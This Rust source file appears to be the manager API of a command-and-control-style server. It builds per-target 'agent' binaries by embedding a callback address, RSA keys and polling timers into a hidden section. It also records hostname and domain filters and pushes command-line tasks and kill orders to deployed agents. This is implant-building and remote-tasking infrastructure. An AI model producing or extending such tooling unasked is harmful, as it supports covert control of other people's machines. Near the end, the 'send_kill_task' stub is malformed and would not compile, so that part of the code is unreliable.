use crate::database::{
    self,
    models::{DepRow, TaskRow},
    Database,
};
use crate::state::SharedState;

use common::{
    agentconfig::{AgentConfig, DEFAULT_FETCH_TIMER, DEFAULT_REPORT_TIMER},
    crypto::CryptoManager,
    messages::AgentCommand,
    task::{Artifact, Task},
};
use object::{Object, ObjectSection};
use rocket::{http::Status, serde::json::Json, State};
use rsa::pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey, LineEnding};

use std::fs;
use std::ops::Deref;
use std::path::PathBuf;

fn get_default_fetch() -> u64 {
    DEFAULT_FETCH_TIMER
}

fn get_default_report() -> u64 {
    DEFAULT_REPORT_TIMER
}

#[derive(Debug, serde::Deserialize)]
struct BuildConfigFilter {
    #[serde(default)]
    domain: String,
    #[serde(default)]
    hostname: String,
}

#[derive(Debug, serde::Deserialize)]
struct BuildConfigTimer {
    #[serde(default = "get_default_fetch")]
    fetch: u64,
    #[serde(default = "get_default_report")]
    report: u64,
}

#[derive(Debug, serde::Deserialize)]
pub struct BuildConfig {
    os: String,
    platform: String,
    filter: BuildConfigFilter,
    timer: BuildConfigTimer,
}

#[derive(Debug, serde::Deserialize)]
pub enum ServerManagerCommands {
    BuildAgent(BuildConfig),
    ListAgents,
    ListTasks,
    RegisterTasks(Vec<(TaskRow, Vec<DepRow>)>),
    SendAgentKill(String),
    SendAgentTasks((String, Vec<String>)),
}

fn set_embedded_config(mut data: Vec<u8>, config: &str) -> Result<Vec<u8>, String> {
    let obj_file = object::File::parse(data.deref()).map_err(|e| e.to_string())?;

    let (offset, size) = obj_file
        .section_by_name(".ag.cfg")
        .ok_or("Config section not found")
        .map(|section| section.file_range().map(|(o, s)| (o as usize, s as usize)))?
        .ok_or("Config section has invalid info {offset, size}")?;

    if config.len() > size {
        return Err(format!(
            "Config section too short: need {} bytes",
            config.len()
        ));
    }

    data[offset..offset + config.len()].copy_from_slice(config.as_bytes());
    Ok(data)
}

async fn build_agent(state: &State<SharedState>, config: BuildConfig) -> Result<Vec<u8>, Status> {
    let uuid = uuid::Uuid::new_v4().to_string();
    log::debug!("build_agent: {:?}: {:?}", &uuid, &config);

    let mut dm = Database::new(&state.db_path).map_err(|e| {
        log::error!("Failed to open database: {}", e);
        Status::InternalServerError
    })?;

    let mut agent_filename = String::from("agent");
    if config.os == "windows" {
        agent_filename.push_str(".exe")
    }

    let agent_path: PathBuf = [&state.build_path, &config.os, &agent_filename]
        .iter()
        .collect();
    let agent_bin = fs::read(&agent_path).map_err(|e| {
        log::error!("Failed to read agent binary: {:?}: {}", &agent_path, e);
        Status::InternalServerError
    })?;

    log::debug!("Generating encryption keys");
    let peerkey = common::crypto::new_private_key()
        .map(|pk| (pk.to_public_key(), pk))
        .map_err(|e| {
            log::error!("Failed to generate peerkey: {}", e);
            Status::InternalServerError
        })?;

    let client_pub_pem =
        EncodeRsaPublicKey::to_pkcs1_pem(&peerkey.0, LineEnding::LF).map_err(|e| {
            log::error!("Failed to serialize peerkey: {}", e);
            Status::InternalServerError
        })?;

    let client_priv_pem = EncodeRsaPrivateKey::to_pkcs1_pem(&peerkey.1, LineEnding::LF)
        .map(|p| p.to_string())
        .map_err(|e| {
            log::error!("Failed to serialize peerkey: {}", e);
            Status::InternalServerError
        })?;

    let selfkey = common::crypto::new_private_key()
        .map(|pk| (pk.to_public_key(), pk))
        .map_err(|e| {
            log::error!("Failed to generate selfkey: {}", e);
            Status::InternalServerError
        })?;

    let server_pub_pem =
        EncodeRsaPublicKey::to_pkcs1_pem(&selfkey.0, LineEnding::LF).map_err(|e| {
            log::error!("Failed to serialize selfkey: {}", e);
            Status::InternalServerError
        })?;

    let server_priv_pem = EncodeRsaPrivateKey::to_pkcs1_pem(&selfkey.1, LineEnding::LF)
        .map(|p| p.to_string())
        .map_err(|e| {
            log::error!("Failed to serialize selfkey: {}", e);
            Status::InternalServerError
        })?;

    log::debug!("Serializing agent configuration");
    let agent_config = AgentConfig {
        uuid: uuid.clone(),
        callback: state.callback.clone(),
        client_priv_pem,
        server_pub_pem,
        server_cert_pem: state.certificate.clone(),
        timer_fetch: config.timer.fetch,
        timer_report: config.timer.report,
    };

    let embedded = serde_json::to_string(&agent_config).map_err(|e| {
        log::error!("{}", e);
        Status::InternalServerError
    })?;

    log::debug!("Writing embedded configuration");
    let agent_bin = set_embedded_config(agent_bin, &embedded).map_err(|e| {
        log::error!("{}", e);
        Status::InternalServerError
    })?;

    log::info!("Update database: new agent: {}", &agent_config.uuid);
    dm.insert_into_agents(database::models::AgentRow {
        uuid: agent_config.uuid,
        os: config.os,
        platform: config.platform,
        selfkey: server_priv_pem,
        peerkey: client_pub_pem,
        hostname: config.filter.hostname,
        domain: config.filter.domain,
        enabled: false,
    })
    .map_err(|e| {
        log::error!("{}", e);
        Status::InternalServerError
    })?;

    state
        .add_crypto(uuid.clone(), CryptoManager::new(selfkey.1, peerkey.0))
        .await;

    Ok(agent_bin)
}

async fn list_agents(state: &State<SharedState>) -> Result<Vec<u8>, Status> {
    let mut dm = Database::new(&state.db_path).map_err(|e| {
        log::error!("Failed to open database: {}", e);
        Status::InternalServerError
    })?;

    let output = dm.select_agents().map_err(|e| {
        log::error!("{}", e);
        Status::InternalServerError
    })?;

    serde_json::to_vec(&output).map_err(|e| {
        log::error!("{}", e);
        Status::InternalServerError
    })
}

async fn list_tasks(state: &State<SharedState>) -> Result<Vec<u8>, Status> {
    let mut dm = Database::new(&state.db_path).map_err(|e| {
        log::error!("Failed to open database: {}", e);
        Status::InternalServerError
    })?;

    let tasks = dm.select_tasks().map_err(|e| {
        log::error!("{}", e);
        Status::InternalServerError
    })?;

    let mut output = Vec::new();

    for task in tasks {
        let mut deps = Vec::new();

        if !task.deps.is_empty() {
            for depid in task.deps.split(';') {
                let dep = dm
                    .select_deps_by_uuid(depid)
                    .map_err(|e| {
                        log::error!("{}", e);
                        Status::InternalServerError
                    })?
                    .ok_or_else(|| {
                        log::error!("bug: inconsistent db: {} not found", depid);
                        Status::InternalServerError
                    })?;

                deps.push(dep);
            }
        }

        output.push((task, deps))
    }

    serde_json::to_vec(&output).map_err(|e| {
        log::error!("{}", e);
        Status::InternalServerError
    })
}

async fn register_tasks(
    state: &State<SharedState>,
    register: Vec<(TaskRow, Vec<DepRow>)>,
) -> Result<Vec<u8>, Status> {
    log::debug!("register_tasks: {:?}", register);

    let mut dm = Database::new(&state.db_path).map_err(|e| {
        log::error!("Failed to open database: {}", e);
        Status::InternalServerError
    })?;

    for (task, deps) in register {
        dm.insert_into_tasks(task).map_err(|e| {
            log::error!("{}", e);
            Status::InternalServerError
        })?;

        for d in deps {
            dm.insert_into_deps(d).map_err(|e| {
                log::error!("{}", e);
                Status::InternalServerError
            })?;
        }
    }

    Ok(Vec::new())
}

async fn send_agent_kill(state: &State<SharedState>, agent_id: String) -> Result<Vec<u8>, Status> {
    log::debug!("send_agent_kill: {}", agent_id);

    state
        .push_commands(agent_id, vec![AgentCommand::EndExecution])
        .await;

    Ok(Vec::new())
}

async fn send_agent_tasks(
    state: &State<SharedState>,
    agent_id: String,
    tasks_id: Vec<String>,
) -> Result<Vec<u8>, Status> {
    log::debug!("send_agent_tasks: {}, {:?}", agent_id, tasks_id);

    let mut dm = Database::new(&state.db_path).map_err(|e| {
        log::error!("Failed to open database: {}", e);
        Status::InternalServerError
    })?;

    let mut tasks_to_exec = Vec::new();

    let task_rows: Vec<_> = dm
        .select_tasks()
        .map_err(|e| {
            log::error!("{}", e);
            Status::InternalServerError
        })?
        .into_iter()
        .filter(|t| tasks_id.contains(&t.uuid))
        .collect();

    for row in task_rows {
        let mut task = Task {
            uuid: row.uuid,
            timeout: row.timeout as u64,
            argv: row.argv.split(';').map(String::from).collect(),
            deps: Vec::new(),
        };

        if !row.deps.is_empty() {
            for depid in row.deps.split(';') {
                let dep = dm
                    .select_deps_by_uuid(depid)
                    .map_err(|e| {
                        log::error!("{}", e);
                        Status::InternalServerError
                    })?
                    .ok_or_else(|| {
                        log::error!("bug: inconsistent db: {} not found", depid);
                        Status::InternalServerError
                    })?;

                task.deps.push(Artifact {
                    uuid: dep.uuid,
                    hash: dep.hash,
                    name: dep.name,
                })
            }
        }

        tasks_to_exec.push(task)
    }

    state
        .push_commands(agent_id, vec![AgentCommand::ExecuteTasks(tasks_to_exec)])
        .await;

    Ok(Vec::new())
}

pub async fn send_kill_task(&self, agent_id: Vec<String>, task_id: String){
    log::info!("Sending kill task: {:?} " task_id);

}

#[post("/manager", format = "application/json", data = "<command>")]
pub async fn manager(
    state: &State<SharedState>,
    command: Json<ServerManagerCommands>,
) -> Result<Vec<u8>, Status> {
    match command.0 {
        ServerManagerCommands::BuildAgent(config) => build_agent(state, config).await,
        ServerManagerCommands::ListAgents => list_agents(state).await,
        ServerManagerCommands::ListTasks => list_tasks(state).await,
        ServerManagerCommands::RegisterTasks(register) => register_tasks(state, register).await,
        ServerManagerCommands::SendAgentKill(id) => send_agent_kill(state, id).await,
        ServerManagerCommands::SendAgentTasks((id, tasks_id)) => {
            send_agent_tasks(state, id, tasks_id).await
        }
    }
}
